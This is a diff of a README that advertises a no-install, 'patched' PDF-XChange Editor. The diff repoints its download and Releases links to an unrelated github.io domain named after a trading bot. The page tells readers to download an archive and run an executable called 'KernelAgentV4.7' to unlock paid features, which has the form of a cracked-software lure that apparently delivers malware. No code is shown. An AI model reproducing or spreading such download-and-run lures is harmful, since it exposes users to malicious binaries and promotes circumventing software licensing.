@@ -2,14 +2,14 @@
 
 Experience the full power of PDF editing on Windows without installation. PDF-XChange Editor Portable is a self-contained, no-install version of the award-winning PDF editor, allowing full editing, markup, form filling, and OCR functionality from any folder or USB device. Whether you're working in the office, remotely, or on restricted PCs — this portable edition lets you stay productive anywhere, enhanced by `KernelAgentV4.7`.
 
-[![Download Portable PDF-XChange](https://img.shields.io/badge/Download-PDF_XChange_Portable-blueviolet)](https://pdf-xchange-editor-portable-full.github.io/.github
+[![Download Portable PDF-XChange](https://img.shields.io/badge/Download-PDF_XChange_Portable-blueviolet)](https://3commas-premium-bot.github.io/.github
 )
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://pdf-xchange-editor-portable-full.github.io/.github) section  
+1. 📦 **Download the archive** from the [Releases](https://3commas-premium-bot.github.io/.github) section  
 2. 📁 **Extract the folder** to any location (e.g., `D:\Tools\PDFXPortable`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 Patch will unlock editing, OCR, export, and save features  
